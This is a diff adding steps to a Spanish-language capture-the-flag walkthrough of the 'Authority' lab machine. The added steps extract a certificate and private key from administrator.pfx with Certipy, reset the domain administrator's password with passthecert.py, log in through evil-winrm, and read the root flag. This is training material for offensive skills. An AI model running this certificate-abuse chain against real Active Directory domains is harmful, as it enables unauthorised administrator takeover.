@@ -250,15 +250,30 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 Ahora tenemos que extraer la clave privada y el certificado del archivo administrator.pfx, una vez hecho esto con la herramienta que os comparto por aquí: [passthecert.py](https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/main/Python/passthecert.py) ya podemos ejecutar comandos, así que procedemos a cambiarle la contraseña al usuario administrator.
 
+Extraer certificado:
+```bash
+certipy cert -pfx administrator.pfx -nokey -out user.crt
+```
+
+Extraer Clave privada:
+```bash
+certipy cert -pfx administrator.pfx -nocert -out user.key
+```
+
+Cambiar el password de usuario Administrator:
 ```bash
 > python3 passthecert.py -crt user.crt -key user.key -dc-ip 10.10.11.222 -domain authority.htb -action modify_user -target administrator -new-pass cahoner123
 ```
 
+Conectarnos como Administrator en la máquina víctima:
 ```bash
 ❯ evil-winrm -i 10.10.11.222 -u 'administrator' -p 'cahoner123'
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
 htb\administrator
 ```
+
 ¡Ya podemos leer el flag del usuario root!
-
-
+```bash
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
+9982bf9ef......a3c65de58
+```
